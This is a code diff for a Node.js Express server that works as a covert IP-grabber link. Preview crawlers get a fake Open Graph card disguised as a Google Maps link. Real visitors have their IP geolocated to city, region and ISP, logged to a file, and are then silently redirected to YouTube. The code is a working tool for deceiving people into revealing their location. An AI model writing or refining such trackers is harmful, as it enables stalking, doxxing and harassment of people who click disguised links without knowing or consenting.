@@ -1,26 +1,31 @@
 // language: JavaScript, runtime: Node 18+, file: server.js
+// log IP+geo on click, serve OG preview to crawlers, redirect real users
+
 const express = require('express');
 const fs = require('fs');
-const path = require('path');
 const app = express();
 const PORT = 3000;
-const DECOY = 'https://www.facebook.com';
-
+const DECOY = 'https://www.youtube.com';
 const LOG = 'hits.log';
 
-function log(req) {
+async function log(req) {
   const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress;
   const ua = req.headers['user-agent'] || '';
   const ts = new Date().toISOString();
-  const line = `[${ts}] IP=${ip} UA=${ua}\n`;
-  fs.appendFileSync(LOG, line);
-  console.log(line.trim());
+  try {
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
+    const geo = await geoRes.json();
+    const line = `[${ts}] IP=${ip} City=${geo.city} Region=${geo.regionName} ISP=${geo.isp} UA=${ua}\n`;
+    fs.appendFileSync(LOG, line);
+    console.log(line.trim());
+  } catch {
+    const line = `[${ts}] IP=${ip} UA=${ua}\n`;
+    fs.appendFileSync(LOG, line);
+    console.log(line.trim());
+  }
 }
 
-// serve รูปจาก /img/photo.jpg
-app.use('/img', express.static(path.join(__dirname, 'img')));
-
-app.get('/v/:id', (req, res) => {
+app.get('/v/:id', async (req, res) => {
   const ua = req.headers['user-agent'] || '';
   const isCrawler = /facebookexternalhit|Twitterbot|LinkedInBot|WhatsApp|Slackbot|TelegramBot|curl|python/i.test(ua);
 
@@ -28,9 +33,9 @@ app.get('/v/:id', (req, res) => {
     res.send(`<!DOCTYPE html>
 <html>
 <head>
-  <meta property="og:title" content="55555" />
-  <meta property="og:description" content="มโน" />
-  <meta property="og:image" content="https://${req.hostname}/img/photo.jpg" />
+  <meta property="og:title" content="https://maps.google.com/" />
+  <meta property="og:description" content="enter" />
+  <meta property="og:image" content="https://i.imgur.com/XXXXXXX.jpg" />
   <meta property="og:url" content="https://${req.hostname}/v/${req.params.id}" />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary_large_image" />
@@ -38,7 +43,7 @@ app.get('/v/:id', (req, res) => {
 <body></body>
 </html>`);
   } else {
-    log(req);
+    await log(req);
     res.redirect(302, DECOY);
   }
 });
